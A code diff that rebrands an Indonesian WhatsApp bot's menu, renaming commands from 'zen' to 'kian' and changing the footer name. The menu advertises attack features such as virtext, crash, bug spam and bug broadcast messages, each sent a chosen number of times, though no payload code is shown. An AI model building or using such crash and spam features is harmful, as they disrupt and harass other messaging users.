-╠➤𝐠𝐚𝐬𝐳𝐞𝐧 𝟏𝟏𝟐𝟔𝟕𝟒𝟒𝟒𝟖𝐱𝐱𝐱
-╠➤𝐳𝐞𝐧𝐬𝐚𝐧𝐭𝐞𝐭𝐠𝐜  𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
+╠➤𝐠𝐚𝐬𝐤𝐢𝐚𝐧 𝟏𝟏𝟐𝟔𝟕𝟒𝟒𝟒𝟖𝐱𝐱𝐱
+╠➤𝐤𝐢𝐚𝐧𝐬𝐚𝐧𝐭𝐞𝐭𝐠𝐜  𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
 ╠➤𝐜𝐚𝐭𝐚𝐥𝐨𝐠𝐠𝐜 𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓 ]══════⊱
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫??𝐞𝐱𝐭𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
@@ -4751,7 +4657,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟏𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟏𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟐𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐁𝐔𝐆 𝐒𝐏𝐀𝐌 ]══════⊱
@@ -4771,13 +4677,13 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐲𝐞𝐞𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐢𝐭𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐥𝐢𝐜𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐤𝐚𝐧𝐠𝐛𝐮𝐭𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐝𝐞𝐥𝐚𝐲 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐬𝐭𝐢𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝐢𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐤𝐚𝐧𝐠𝐛𝐮𝐭𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐝𝐞𝐥𝐚𝐲 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐬𝐭𝐢𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝐢𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐮𝐠𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐨𝐤𝐞𝐩 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐨𝐤𝐞𝐩 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐮𝐠𝐢𝐧𝐯𝐢𝐭𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ] 𝐏𝐜
 ╠➤𝐡𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐡𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
@@ -4791,75 +4697,75 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐜𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐨 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐠𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐩𝐨𝐥𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐚𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐠𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐩𝐨𝐥𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐚𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐢𝐧𝐢𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐡𝐢𝐲𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐝𝐨𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐝𝐨𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐝𝐮𝐜 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐫𝐨𝐥𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐫𝐨𝐥𝐢𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐫𝐨𝐥𝐢𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐣𝐡𝐨𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐣𝐡𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐮𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐫𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐤𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐝𝐫𝐚𝐤𝐧𝐞𝐬
-╠➤𝐳𝐞𝐧𝐬𝐥𝐞𝐛𝐞𝐰 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐬𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐦𝐞𝐦𝐞𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐨𝐧𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐭𝐞𝐱𝐭𝐯 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐠𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐜𝐫𝐚𝐬𝐡𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐥𝐨𝐤𝐚𝐬𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐤𝐚𝐧𝐠𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐤𝐚𝐧𝐠𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐛𝐚𝐫 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐨𝐤𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐞𝐰𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐧𝐠𝐞𝐧𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐫𝐨𝐥𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐫𝐨𝐥𝐢𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐫𝐨𝐥𝐢𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐣𝐡𝐨𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐣𝐡𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐮𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐫𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐤𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐝𝐫𝐚𝐤𝐧𝐞𝐬
+╠➤𝐤𝐢𝐚𝐧𝐬𝐥𝐞𝐛𝐞𝐰 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐬𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐦𝐞𝐦𝐞𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐨𝐧𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐭𝐞𝐱𝐭𝐯 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐠𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐜𝐫𝐚𝐬𝐡𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐥𝐨𝐤𝐚𝐬𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐤𝐚𝐧𝐠𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐤𝐚𝐧𝐠𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐛𝐚𝐫 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐨𝐤𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐞𝐰𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐧𝐠𝐞𝐧𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐬𝐩𝐚𝐦 [ 𝐑𝐞𝐩𝐥𝐲 𝐏𝐞𝐬𝐚𝐧 ]
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐉𝐀𝐃𝐈 𝐁𝐔𝐆 ]══════⊱
@@ -4868,7 +4774,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟑 [ 𝐑𝐞𝐩𝐥𝐲 𝐀𝐮𝐝𝐢𝐨 𝐉𝐚𝐝𝐢 𝐁𝐮𝐠 𝐕𝐧 ]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟒 [ 𝐑𝐞𝐩𝐥𝐲 𝐒𝐭𝐢𝐜𝐤𝐞𝐫 𝐉𝐚𝐝𝐢 𝐁𝐮𝐠 𝐆𝐚𝐦𝐛𝐚𝐫 ]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟓 [ 𝐑𝐞𝐩𝐥𝐲 𝐆𝐚𝐦𝐛𝐚𝐫 𝐉𝐚𝐝𝐢 𝐁𝐮𝐠 𝐎𝐧𝐜𝐞 ] 
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹]══════⊱
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐁𝐔𝐆 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 ]══════⊱
@@ -4876,8 +4782,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐛𝐮𝐠𝐛𝐜𝐯𝐢𝐝𝐞𝐨 [ 𝐁𝐮𝐠 𝐕𝐢𝐝𝐞𝐨 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬 ]
 ╠➤𝐛𝐮𝐠𝐛𝐜 𝐚𝐮𝐝𝐢𝐨 [ 𝐁𝐮𝐠 𝐀𝐮𝐝𝐢𝐨 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 ]
 ╠➤𝐛𝐮𝐠𝐛𝐜𝐭𝐞𝐱𝐭 [ 𝐁𝐮𝐠 𝐓𝐞𝐱𝐭 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 ]
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
